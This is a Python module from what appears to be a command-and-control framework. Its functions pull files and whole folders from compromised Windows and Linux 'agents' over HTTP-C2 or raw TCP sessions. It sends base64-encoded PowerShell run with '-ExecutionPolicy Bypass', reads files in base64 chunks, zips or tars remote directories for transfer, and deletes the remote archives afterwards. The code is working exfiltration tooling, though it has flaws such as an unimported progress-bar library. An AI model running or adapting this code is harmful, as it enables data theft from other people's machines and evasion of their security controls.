import logging

logger = logging.getLogger(__name__)

import base64, socket
import re
import threading
from core import utils
from core.session_handlers import session_manager, sessions
from core.utils import defender
from core.session_handlers.sessions import SessionManager

# Command Execution Imports
from core.command_execution.http_command_execution import run_command_http as http_exec
from core.command_execution.tcp_command_execution import run_command_tcp as tcp_exec

import queue
import subprocess, os, sys

from time import sleep
import signal
import tarfile
import zipfile
import time
import shutil
import tempfile

import ssl


from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

global global_tcpoutput_blocker
global_tcpoutput_blocker = 0

def print_raw_progress(current, total, bar_width=40):
	percent = current / total
	done = int(bar_width * percent)
	bar = "[" + "#" * done + "-" * (bar_width - done) + f"] {int(percent * 100)}%"
	sys.stdout.write("\r" + bar)
	sys.stdout.flush()

# Interactive shells removed.


def _session_display_name(sid: str) -> str:
    return next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

def _os_type_for(sid: str) -> str:
    return session_manager.sessions[sid].metadata.get("os", "").lower()

# Interactive functions removed as part of CLI cleanup.


### 🧨 File download logic:

# Create encoded powershell command string
def build_powershell_encoded_download(remote_file):
	#safe_path = remote_file.replace("\\", "\\\\")
	#print(remote_file)
	#print(safe_path)



	raw_command = (
		f"[Console]::OutputEncoding = [System.Text.Encoding]::ASCII; "
		f"$bytes = [IO.File]::ReadAllBytes('{remote_file}'); "
		"[Convert]::ToBase64String($bytes)"
	)
	#print(raw_command)
	encoded_bytes = raw_command.encode("utf-16le")
	encoded_b64 = base64.b64encode(encoded_bytes).decode()
	full_cmd = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_b64}"
	return full_cmd

	# Encode to UTF-16LE as required by EncodedCommand
	#utf16_command = raw_command.encode("utf-16le")
	#encoded_command = base64.b64encode(utf16_command).decode()

	#return f"powershell -EncodedCommand {encoded_command}"



def download_file_http(sid, remote_file, local_file, op_id="console"):
	session = session_manager.sessions[sid]
	meta = session.metadata

	if not op_id:
		op_id = "console"

	if meta.get("os", "").lower() == "linux":
		host = meta.get("hostname", "").lower()
		CHUNK_SIZE = 30000  # Number of bytes per chunk (before base64 encoding)
		MAX_CHUNKS = 10000  # Safeguard to prevent infinite loop

		"""# Get file size first
		size_cmd = f"stat -c %s {remote_file}"
		session.command_queue.put(base64.b64encode(size_cmd.encode()).decode())
		file_size_raw = session.output_queue.get()

		print(brightyellow + f"[*] Downloading file from {host} in chunks...")

		try:
			file_size = int(base64.b64decode(file_size_raw).decode().strip())
		except:
			print(brightred + f"[-] Failed to get file size for {remote_file}")
			return"""

		# Step 1: Get file size via HTTP‐C2
		size_output = http_exec(sid, f"stat -c %s {remote_file}", op_id=op_id)
		logger.debug(brightyellow + f"SIZE OUTPUT: {size_output}")
		try:
			file_size = int(size_output.strip())
		except Exception:
			print(brightred + f"[-] Failed to get file size for {remote_file}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		collected_b64 = ""
		collection = bytearray()

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				"""chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
				b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()

				session.command_queue.put(b64_chunk_cmd)
				chunk_output = session.output_queue.get()"""

				# Step 2: Fetch each chunk via HTTP-C2
				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
				chunk_output = http_exec(sid, chunk_cmd, op_id=op_id)

				try:
					data = base64.b64decode(chunk_output)
					collection.extend(data)
					pbar.update(1)
				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break

				"""try:
					chunk_decoded = base64.b64decode(chunk_output)
					data_decode = base64.b64decode(chunk_decoded)
					collection.extend(data_decode)
					#collected_b64 += chunk_decoded
					pbar.update(1)
				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break"""

		try:
			#decoded_file = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(collection)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error decoding final file: {e}")

	elif meta.get("os", "") .lower() == "windows":
		CHUNK_SIZE = 1024 * 1024  # Adjust safely for command length + base64
		MAX_CHUNKS = 10000

		print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

		# Step 1: Get file size
		size_cmd = (
		f"$s=(Get-Item \"{remote_file}\").Length;"
		f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
		)

		"""b64_size_cmd = base64.b64encode(size_cmd.encode()).decode()
		session.command_queue.put(b64_size_cmd)
		size_b64 = session.output_queue.get()
		print(size_b64)

		try:
			size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
			file_size = int(size_str.strip())
			#size_str = base64.b64decode(size_b64).decode().strip()
			#file_size = int(size_str)

		except Exception as e:
			print(brightred + f"[-] Failed to parse file size: {e}")
			return"""

		sleep(0.03)
		logger.debug(brightyellow + f"RUNNING COMMAND {size_cmd}" + reset)
		size_output = http_exec(sid, size_cmd, op_id=op_id)
		logger.debug(f"SIZE OUTPUT IN DOWNLOAD FILE: {size_output}")
		try:
			# size_output is something like "49,50,51,…"
			size_bytes = bytes(int(x) for x in size_output.split(","))
			file_size = int(size_bytes.decode().strip())

		except Exception as e:
			print(brightred + f"[-] Failed to parse file size: {e}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		#print(total_chunks)
		#collected_b64 = ""
		#collected_b64 = bytearray()
		collection = bytearray()

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE

				# Step 2: Read chunk using PowerShell and base64 encode it
				chunk_cmd = (
					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
					f"$fs.Seek({offset},'Begin') > $null;"
					f"$buf = New-Object byte[] {CHUNK_SIZE};"
					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
					f"$fs.Close();"
					f"[Convert]::ToBase64String($buf, 0, $read)"
				)

				# Step 2: Fetch this chunk via HTTP-C2
				chunk_output = http_exec(sid, chunk_cmd, op_id=op_id)

				try:
					data = base64.b64decode(chunk_output)
					collection.extend(data)
					pbar.update(1)
				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break
				

				"""b64_chunk_cmd = base64.b64encode(chunk_cmd.encode()).decode()
				session.command_queue.put(b64_chunk_cmd)
				chunk_output = session.output_queue.get()

				try:
					#chunk_decoded = base64.b64decode(chunk_output).decode()
					chunk_decoded = base64.b64decode(chunk_output)
					data_decode = base64.b64decode(chunk_decoded)
					collection.extend(data_decode)
					#collected_b64 += chunk_decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break"""

		# Step 3: Final decode & write
		try:
			#print(type(collected_b64))
			#print(collected_b64)
			#collect_decoded = base64.b64decode(collected_b64)
			#decode_bytes = collect_decoded.decode(errors='ignore').strip()
			
			with open(local_file, "wb") as f:
				f.write(collection)


			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass
			#subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
			#os.replace(local_file + '.tmp', local_file)

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error decoding final file: {e}")

def download_folder_http(sid, remote_dir, local_dir, op_id="console"):
	session = session_manager.sessions[sid]
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	meta = session.metadata
	os_type = meta.get("os","").lower()

	if not op_id:
		op_id = "console"

	remote_dir = remote_dir.rstrip("/\\")
	base = os.path.basename(remote_dir)

	try:
		os.makedirs(local_dir, exist_ok=True)

	except Exception as e:
		print(brightred + f"[-] ERROR failed to create local output directory: {e}")

	local_zip = os.path.join(local_dir, f"{base}.zip")

	if "windows" in os_type:
		remote_zip = f"{remote_dir}.zip"
		# 1) create an empty zip if needed (no output)
		cmd = ("if(-Not (Test-Path \"{0}\"))"
			"{{ Set-Content \"{0}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)) }}").format(remote_zip)

		http_exec(sid, cmd, output=False, op_id=op_id)

		# 2) copy the folder contents into it via .NET
		zip_cmd = (
			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
			"[IO.Compression.CompressionLevel]::Optimal,$false)"
		)


		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
		http_exec(sid, zip_cmd, output=False, op_id=op_id)

		# 2a) wait until the zip actually exists on the remote
		check_ps = (
			f"if (Test-Path \"{remote_zip}\") "
			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
		)

		print(brightyellow + "[*] Waiting for remote archive to appear…")
		while True:
			out = http_exec(sid, check_ps, op_id=op_id)
			logger.debug(f"TEST PATH OUTPUT: {out}")
			if out and "EXISTS" in out.upper():
				logger.debug(brightgreen + f"FOUND EXISTS IN OUTPUT")
				break

			logger.debug("SLEEPING AND WAITING FOR EXISTS IN OUTPUT")
			time.sleep(1)

		# 3) download the .zip
		try:
			local_zip = local_dir.rstrip(os.sep) + ".zip"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define local zip variable: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_zip}…")

		#session.output_queue.get()
		#remote_zip = remote_zip.replace("\\", "\\\\")
		logger.debug("DOWNLOADING FILE")
		download_file_http(sid, remote_zip, local_zip, op_id=op_id)

		# 4) extract locally
		if not os.path.isdir(local_dir):
			os.makedirs(local_dir, exist_ok=True)

		print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
		with zipfile.ZipFile(local_zip, 'r') as zf:
			for info in zf.infolist():
				# normalize any backslashes to forward slashes
				path = info.filename.replace('\\', '/')
				# directory entry if ends with slash or is_dir()
				is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
				dest_path = os.path.join(local_dir, *path.split('/'))

				if is_dir:
					os.makedirs(dest_path, exist_ok=True)
					continue

				# file entry
				os.makedirs(os.path.dirname(dest_path), exist_ok=True)
				with zf.open(info) as src, open(dest_path, 'wb') as dst:
					shutil.copyfileobj(src, dst)

		os.remove(local_zip)

		# 5) cleanup remote zip (no output)
		cleanup_cmd = f"Remove-Item \"{remote_zip}\" -Force"
		http_exec(sid, cleanup_cmd, output=False, op_id=op_id)

		print(brightgreen + "[+] Extraction complete")

	elif "linux" in os_type:
		remote_tar = f"/tmp/{base}.tar.gz"

		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
		
		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
	
		try:
			local_tar = local_dir.rstrip(os.sep) + ".tar.gz"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_tar}…")

		download_file_tcp(sid, remote_tar, local_tar)

		print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")

		try:
			with tarfile.open(local_tar, "r:gz") as t:
				try:
					t.extractall(path=local_dir)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to extract files from local zip archive: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to open local zip archive: {e}")

		try:
			os.remove(local_tar)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup: {e}")

		cmd = f"rm -rf \"{remote_tar}\""

		try:
			b64_cmd = base64.b64encode(cmd.encode()).decode()

		except Exception as e:
			print(brightred + f"[-] ERROR failed to encode command: {e}")

		session.command_queue.put(b64_cmd)
		
		print(brightgreen + "[+] Extraction complete")


def download_folder_tcp(sid, remote_dir, local_dir):
	session = session_manager.sessions[sid]
	meta = session.metadata
	os_type = meta.get("os","").lower()

	remote_dir = remote_dir.rstrip("/\\")
	base = os.path.basename(remote_dir)

	if "windows" in os_type:
		remote_zip = f"{remote_dir}.zip"
		# create empty zip
		cmd = (
			f"\"if(-Not (Test-Path \"{remote_zip}\"))"
			f"{{Set-Content \"{remote_zip}\" ([byte[]](80,75,5,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))}}\""
		)
		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)

		# COM copy into zip
		zip_cmd = (
			"[Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null; "
			f"[IO.Compression.ZipFile]::CreateFromDirectory(\"{remote_dir}\",\"{remote_zip}\","
			"[IO.Compression.CompressionLevel]::Optimal,$false)"
		)

		print(brightyellow + f"[*] Zipping remote folder {remote_dir} → {remote_zip}…")
		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)

		check_ps = (
			f"if (Test-Path \"{remote_zip}\") "
			"{{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOPE' }}"
		)

		try:
			while True:
				global_tcpoutput_blocker = 0
				out = tcp_exec(sid, check_ps, timeout=0.5)
				try:
					if "EXISTS" in out or "exists" in out:
						break
					time.sleep(1)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to strip command output: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR we hit an unknown error while checking for remote zip existence: {e}")

		try:
			local_zip = local_dir.rstrip(os.sep) + ".zip"

		except Exception as e:
			print(brightred + f"[-] ERROR failed to define path for local zip archive: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_zip}…")
		download_file_tcp(sid, remote_zip, local_zip)

		if not os.path.isdir(local_dir):
			try:
				os.makedirs(local_dir, exist_ok=True)

			except Exception as e:
				print(brightred + f"[-] ERROR failed to create local output directory: {e}")

		print(brightyellow + f"[*] Extracting {local_zip} → {local_dir}…")
		with zipfile.ZipFile(local_zip, 'r') as zf:
			for info in zf.infolist():
				# normalize any backslashes to forward slashes
				path = info.filename.replace('\\', '/')
				# directory entry if ends with slash or is_dir()
				is_dir = path.endswith('/') or getattr(info, "is_dir", lambda: False)()
				dest_path = os.path.join(local_dir, *path.split('/'))

				if is_dir:
					os.makedirs(dest_path, exist_ok=True)
					continue

				# file entry
				os.makedirs(os.path.dirname(dest_path), exist_ok=True)

				
				with zf.open(info) as src, open(dest_path, 'wb') as dst:
					shutil.copyfileobj(src, dst)

		try:
			os.remove(local_zip)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")

		cmd = f"Remove-Item \"{remote_zip}\" -Force"
		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)

		print(brightgreen + "[+] Extraction complete")

	elif "linux" in os_type:
		remote_tar = f"/tmp/{base}.tar.gz"

		print(brightyellow + f"[*] Archiving remote folder {remote_dir} → {remote_tar}…")
		cmd = f"tar czf \"{remote_tar}\" -C \"{remote_dir}\" ."
		
		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)

		try:
			local_tar = local_dir.rstrip(os.sep) + ".tar.gz"

		except Exception as e:
			print(brightred + f"[-] ERROR failed defining local zip location: {e}")

		print(brightyellow + f"[*] Downloading archive to {local_tar}…")

		download_file_tcp(sid, remote_tar, local_tar)

		print(brightyellow + f"[*] Extracting {local_tar} → {local_dir}…")

		try:
			with tarfile.open(local_tar, "r:gz") as t:
				try:
					t.extractall(path=local_dir)

				except Exception as e:
					print(brightred + f"[-] ERROR failed to extract zip archive: {e}")

		except Exception as e:
			print(brightred + f"[-] ERROR failed to open local zip archive: {e}")

		try:
			os.remove(local_tar)

		except Exception as e:
			print(brightred + f"[-] ERROR failed to delete local zip archive in cleanup stage: {e}")

		cmd = f"rm -rf \"{remote_tar}\""
		tcp_exec(sid, cmd, timeout=0.5, portscan_active=True, retries=1)

		print(brightgreen + "[+] Extraction complete")

	else:
		print(brightred + f"[-] ERROR unsupported operating system.")




def download_file_tcp(sid, remote_file, local_file):
	client_socket = session_manager.sessions[sid].handler
	session = session_manager.sessions[sid]
	meta = session.metadata

	if meta.get("os", "").lower() == "linux":
		CHUNK_SIZE = 60000
		MAX_CHUNKS = 10000
		host = meta.get("hostname", "").lower()

		print(brightyellow + f"[*] Downloading file from {host} in chunks over TCP...")

		# Step 1: Get file size
		size_cmd = f"stat -c %s {remote_file}"
		client_socket.sendall((size_cmd + "\n").encode())

		file_size_raw = b""
		client_socket.settimeout(2)
		while True:
			try:
				chunk = client_socket.recv(4096)

				if not chunk:
					break

				file_size_raw += chunk

			except socket.timeout:
				break

		try:
			file_size = file_size_raw.decode()
			stripped_file_size = file_size.strip()
			clean_file_size = stripped_file_size.splitlines()[0].strip()
			number_file_size = int(clean_file_size)
			#print(decoded_file_size)
			#file_size = int(file_size_raw.decode().strip())

		except Exception as e:
			print(brightred + f"[-] Failed to get file size: {e}")
			return

		try:
			total_chunks = (number_file_size + CHUNK_SIZE - 1) // CHUNK_SIZE

		except Exception as e:
			print(brightred + f"[-] ERROR failed to calculate total chunks: {e}")

		collected_b64 = ""

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				chunk_cmd = f"tail -c +{offset + 1} {remote_file} | head -c {CHUNK_SIZE} | base64"
				client_socket.sendall((chunk_cmd + "\n").encode())

				chunk_data = b""
				while True:
					try:
						part = client_socket.recv(4096)

						if not part:
							break

						chunk_data += part

					except socket.timeout:
						break

				try:
					decoded = chunk_data.decode(errors='ignore').strip()
					#decoded = base64.b64decode(chunk_data.decode().strip())
					collected_b64 += decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
					break

		try:
			final_bytes = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(final_bytes)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			print(brightgreen + f"[+] Download complete. Saved to {local_file}")

		except Exception as e:
			print(brightred + f"[!] Error saving file: {e}")


	elif meta.get("os", "").lower() == "windows":
		CHUNK_SIZE = 30000

		try:
			# Get file size
			size_cmd = (
				f"$s=(Get-Item \"{remote_file}\").Length;"
				f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
			)
			client_socket.sendall((size_cmd + "\n").encode())
			raw_size = client_socket.recv(4096).decode()
			size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
			file_size = int(size_str.strip())
			

		except Exception as e:
			print(brightred + f"[-] Failed to get file size: {e}")
			return

		total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
		collected_b64 = ""

		print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")

		with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
			for i in range(total_chunks):
				offset = i * CHUNK_SIZE
				chunk_cmd = (
					f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
					f"$fs.Seek({offset},'Begin') > $null;"
					f"$buf = New-Object byte[] {CHUNK_SIZE};"
					f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
					f"$fs.Close();"
					f"[Convert]::ToBase64String($buf, 0, $read)"
				)

				client_socket.sendall((chunk_cmd + "\n").encode())

				client_socket.settimeout(3)
				chunk_data = b""
				try:
					expected_encoded_len = int(((CHUNK_SIZE + 2) // 3) * 4)  # Base64 size
					while len(chunk_data) < expected_encoded_len:
						try:
							part = client_socket.recv(4096)
							if not part:
								break

							chunk_data += part

							if b"\n" in part:
								break

						except Exception as e:
							print(brightred + f"[-] ERROR an error ocurred: {e}")

				except socket.timeout:
					pass

				try:
					#base64_decoded_chunk = base64.b64decode(chunk_data)
					chunk_decoded = chunk_data.decode(errors='ignore').strip()
					#chunk_decoded = base64.b64decode(chunk_data).decode()
					collected_b64 += chunk_decoded
					pbar.update(1)

				except Exception as e:
					print(brightred + f"[-] Failed decoding chunk {i+1}: {e}")
					break

		try:
			final_data = base64.b64decode(collected_b64.encode())

			with open(local_file, "wb") as f:
				f.write(final_data)

			with open(local_file, "rb") as f:
				bom = f.read(2)

			# UTF-16LE BOM is 0xFF 0xFE
			if bom == b"\xff\xfe":
				# it’s UTF-16LE — convert it in-place
				tmp = local_file + ".utf8"
				subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
				os.replace(local_file + '.tmp', local_file)
				
				#print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")

			else:
				pass

			#subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
			#os.replace(local_file + '.tmp', local_file)

			print(brightgreen + f"\n[+] Download complete. Saved to {local_file}\n")

		except Exception as e:
			print(brightred + f"[!] Error writing final file: {e}")
			

def get_display(sid):
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
	return display

def run_quiet_tcpcmd(sid, cmd, timeout=0.5, portscan_active=True, retries=1):
	global_tcpoutput_blocker = 1
	tcp_exec(sid, cmd, timeout)
	global_tcpoutput_blocker = 0
